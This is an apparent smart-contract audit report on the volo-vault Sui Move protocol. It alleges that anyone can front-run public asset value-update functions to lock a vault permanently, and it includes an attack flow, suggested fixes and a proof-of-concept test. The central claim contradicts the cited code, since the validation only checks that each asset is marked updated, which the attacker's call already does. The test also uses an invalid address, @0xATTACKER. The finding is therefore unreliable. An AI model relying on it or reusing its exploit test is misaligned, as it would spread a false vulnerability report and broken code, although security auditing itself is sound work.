# Audit Report

## Title
Vault Operation DoS via Front-Running Asset Value Updates During Phase 3

## Summary
The adaptor value update functions (`update_navi_position_value`, `update_cetus_position_value`, etc.) are public and lack proper vault status checks, allowing anyone to front-run the operator during Phase 3 of vault operations. This causes the operator's transactions to abort when attempting to update already-marked assets, permanently locking the vault in `VAULT_DURING_OPERATION_STATUS` with no recovery mechanism.

## Finding Description

All adaptor update functions are declared as `public` without access restrictions: [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) 

These functions call `vault.finish_update_asset_value()`, which only validates that the vault is not disabled via `assert_enabled()`: [6](#0-5) 

The `assert_enabled()` function permits calls when the vault is in `VAULT_DURING_OPERATION_STATUS`: [7](#0-6) 

During Phase 3 (after `end_op_with_bag` enables value updates), `finish_update_asset_value` tracks updated assets by adding them to a Table: [8](#0-7) 

The critical flaw is that calling `.add()` on a Sui Move Table with an existing key causes the transaction to abort. The operator MUST successfully call these update functions for all borrowed assets to complete Phase 3: [9](#0-8) 

The validation function checks that all borrowed assets have been marked as updated: [10](#0-9) 

**Attack Flow:**
1. Operator starts operation (Phase 1) - vault enters `VAULT_DURING_OPERATION_STATUS`
2. Operator completes Phase 2 via `end_op_with_bag`, which enables value updates
3. Attacker monitors blockchain and detects Phase 3 has started
4. Attacker front-runs operator by calling update functions (e.g., `update_navi_position_value`)
5. Attacker's calls succeed, adding asset types to `asset_types_updated` Table
6. Operator's subsequent update calls abort due to duplicate key insertion
7. Operator cannot complete `end_op_value_update_with_bag` because the validation at line 354 expects the operator's explicit update calls, not just any update
8. Vault remains permanently stuck in `VAULT_DURING_OPERATION_STATUS`

## Impact Explanation

**Severity: HIGH**

This vulnerability causes complete denial of service of the vault with no recovery path:

- **Vault Lockup:** The vault becomes permanently stuck in `VAULT_DURING_OPERATION_STATUS` because Phase 3 cannot be completed.
  
- **User Fund Inaccessibility:** All user operations (deposits, withdrawals, new operations) are blocked because they require `VAULT_NORMAL_STATUS`: [11](#0-10) 

- **No Recovery Mechanism:** The admin cannot disable the vault to recover because `set_enabled()` explicitly blocks calls during operation: [12](#0-11) 

- **Only Resolution:** Contract upgrade required, which is time-consuming and complex.

The vulnerability affects **all adaptor types** (Navi, Cetus, Suilend, Momentum, Receipt), making it broadly applicable across the protocol's DeFi integrations.

## Likelihood Explanation

**Likelihood: HIGH**

- **Trivial Attack Complexity:** Single transaction calling publicly accessible functions. No special privileges or tokens required.

- **Low Attack Cost:** Only gas fees needed. No economic barrier prevents exploitation.

- **Easy Detection:** Attacker can monitor blockchain for vault operations entering Phase 3 (identifiable by `OperationEnded` event and subsequent value update calls).

- **High Attack Motivation:** Attacker can disrupt protocol operations, potentially for ransom or competitive advantage.

- **Reproducible:** Any user can execute this attack at any time during Phase 3 of any vault operation.

## Recommendation

Add vault status checks to all adaptor update functions to restrict calls during operations. Implement one of these solutions:

**Solution 1: Restrict to NORMAL status only**
```move
public fun update_navi_position_value<PrincipalCoinType>(
    vault: &mut Vault<PrincipalCoinType>,
    config: &OracleConfig,
    clock: &Clock,
    asset_type: String,
    storage: &mut Storage,
) {
    vault.assert_normal(); // Add this check
    let account_cap = vault.get_defi_asset<PrincipalCoinType, NaviAccountCap>(asset_type);
    // ... rest of function
}
```

**Solution 2: Require operator capability during operations**
```move
public fun update_navi_position_value<PrincipalCoinType>(
    vault: &mut Vault<PrincipalCoinType>,
    operation: &Operation,
    cap: &OperatorCap,
    config: &OracleConfig,
    clock: &Clock,
    asset_type: String,
    storage: &mut Storage,
) {
    if (vault.status() == VAULT_DURING_OPERATION_STATUS) {
        vault::assert_operator_not_freezed(operation, cap);
    }
    // ... rest of function
}
```

Apply this fix to all adaptor update functions: `update_navi_position_value`, `update_cetus_position_value`, `update_suilend_position_value`, `update_momentum_position_value`, and `update_receipt_value`.

## Proof of Concept

```move
#[test]
#[expected_failure(abort_code = sui::dynamic_field::EFieldAlreadyExists)]
public fun test_dos_via_frontrun_value_update() {
    let mut s = test_scenario::begin(OWNER);
    let mut clock = clock::create_for_testing(s.ctx());
    
    // Initialize vault with Navi asset
    init_vault::init_vault(&mut s, &mut clock);
    init_vault::init_create_vault<SUI_TEST_COIN>(&mut s);
    
    s.next_tx(OWNER);
    {
        let mut vault = s.take_shared<Vault<SUI_TEST_COIN>>();
        let navi_account_cap = lending::create_account(s.ctx());
        vault.add_new_defi_asset(0, navi_account_cap);
        test_scenario::return_shared(vault);
    };
    
    // Operator starts operation Phase 1 & 2
    s.next_tx(OWNER);
    {
        let operation = s.take_shared<Operation>();
        let mut vault = s.take_shared<Vault<SUI_TEST_COIN>>();
        let cap = s.take_from_sender<OperatorCap>();
        
        let defi_asset_ids = vector[0];
        let defi_asset_types = vector[type_name::get<NaviAccountCap>()];
        
        let (asset_bag, tx_bag, tx_bag_update, principal, coin_asset) = 
            operation::start_op_with_bag<SUI_TEST_COIN, USDC_TEST_COIN, SUI_TEST_COIN>(
                &mut vault, &operation, &cap, &clock, 
                defi_asset_ids, defi_asset_types, 0, 0, s.ctx()
            );
        
        // Phase 2: Return assets
        operation::end_op_with_bag<SUI_TEST_COIN, USDC_TEST_COIN, SUI_TEST_COIN>(
            &mut vault, &operation, &cap, asset_bag, tx_bag, principal, coin_asset
        );
        
        test_scenario::return_shared(vault);
        test_scenario::return_shared(operation);
        s.return_to_sender(cap);
    };
    
    // ATTACKER front-runs operator's value update (Phase 3)
    s.next_tx(@0xATTACKER);
    {
        let mut vault = s.take_shared<Vault<SUI_TEST_COIN>>();
        let config = s.take_shared<OracleConfig>();
        let mut storage = s.take_shared<Storage>();
        
        let navi_asset_type = vault_utils::parse_key<NaviAccountCap>(0);
        
        // Attacker calls public function - succeeds
        navi_adaptor::update_navi_position_value(
            &mut vault, &config, &clock, navi_asset_type, &mut storage
        );
        
        test_scenario::return_shared(vault);
        test_scenario::return_shared(config);
        test_scenario::return_shared(storage);
    };
    
    // OPERATOR tries to complete Phase 3 - ABORTS due to duplicate key
    s.next_tx(OWNER);
    {
        let operation = s.take_shared<Operation>();
        let mut vault = s.take_shared<Vault<SUI_TEST_COIN>>();
        let cap = s.take_from_sender<OperatorCap>();
        let config = s.take_shared<OracleConfig>();
        let mut storage = s.take_shared<Storage>();
        
        let navi_asset_type = vault_utils::parse_key<NaviAccountCap>(0);
        
        // This call will ABORT - asset already marked as updated by attacker
        navi_adaptor::update_navi_position_value(
            &mut vault, &config, &clock, navi_asset_type, &mut storage
        );
        
        // Operator can never reach this line - vault permanently locked
        // operation::end_op_value_update_with_bag(...);
    };
}
```

The test demonstrates that after the attacker front-runs the value update, the operator's transaction aborts with `EFieldAlreadyExists`, preventing Phase 3 completion and permanently locking the vault.

### Citations

**File:** volo-vault/sources/adaptors/navi_adaptor.move (L13-13)
```text
public fun update_navi_position_value<PrincipalCoinType>(
```

**File:** volo-vault/sources/adaptors/cetus_adaptor.move (L19-19)
```text
public fun update_cetus_position_value<PrincipalCoinType, CoinA, CoinB>(
```

**File:** volo-vault/sources/adaptors/suilend_adaptor.move (L23-23)
```text
public fun update_suilend_position_value<PrincipalCoinType, ObligationType>(
```

**File:** volo-vault/sources/adaptors/momentum.adaptor.move (L21-21)
```text
public fun update_momentum_position_value<PrincipalCoinType, CoinA, CoinB>(
```

**File:** volo-vault/sources/adaptors/receipt_adaptor.move (L16-16)
```text
public fun update_receipt_value<PrincipalCoinType, PrincipalCoinTypeB>(
```

**File:** volo-vault/sources/volo_vault.move (L518-523)
```text
public(package) fun set_enabled<PrincipalCoinType>(
    self: &mut Vault<PrincipalCoinType>,
    enabled: bool,
) {
    self.check_version();
    assert!(self.status() != VAULT_DURING_OPERATION_STATUS, ERR_VAULT_DURING_OPERATION);
```

**File:** volo-vault/sources/volo_vault.move (L645-647)
```text
public(package) fun assert_enabled<PrincipalCoinType>(self: &Vault<PrincipalCoinType>) {
    assert!(self.status() != VAULT_DISABLED_STATUS, ERR_VAULT_NOT_ENABLED);
}
```

**File:** volo-vault/sources/volo_vault.move (L649-651)
```text
public(package) fun assert_normal<PrincipalCoinType>(self: &Vault<PrincipalCoinType>) {
    assert!(self.status() == VAULT_NORMAL_STATUS, ERR_VAULT_NOT_NORMAL);
}
```

**File:** volo-vault/sources/volo_vault.move (L1174-1181)
```text
public(package) fun finish_update_asset_value<PrincipalCoinType>(
    self: &mut Vault<PrincipalCoinType>,
    asset_type: String,
    usd_value: u256,
    now: u64,
) {
    self.check_version();
    self.assert_enabled();
```

**File:** volo-vault/sources/volo_vault.move (L1189-1195)
```text
    if (
        self.status() == VAULT_DURING_OPERATION_STATUS 
        && self.op_value_update_record.value_update_enabled 
        && self.op_value_update_record.asset_types_borrowed.contains(&asset_type)
    ) {
        self.op_value_update_record.asset_types_updated.add(asset_type, true);
    };
```

**File:** volo-vault/sources/volo_vault.move (L1206-1218)
```text
public(package) fun check_op_value_update_record<PrincipalCoinType>(
    self: &Vault<PrincipalCoinType>,
) {
    self.check_version();
    self.assert_enabled();
    assert!(self.op_value_update_record.value_update_enabled, ERR_OP_VALUE_UPDATE_NOT_ENABLED);

    let record = &self.op_value_update_record;

    record.asset_types_borrowed.do_ref!(|asset_type| {
        assert!(record.asset_types_updated.contains(*asset_type), ERR_USD_VALUE_NOT_UPDATED);
        assert!(*record.asset_types_updated.borrow(*asset_type), ERR_USD_VALUE_NOT_UPDATED);
    });
```

**File:** volo-vault/sources/operation.move (L354-354)
```text
    vault.check_op_value_update_record();
```
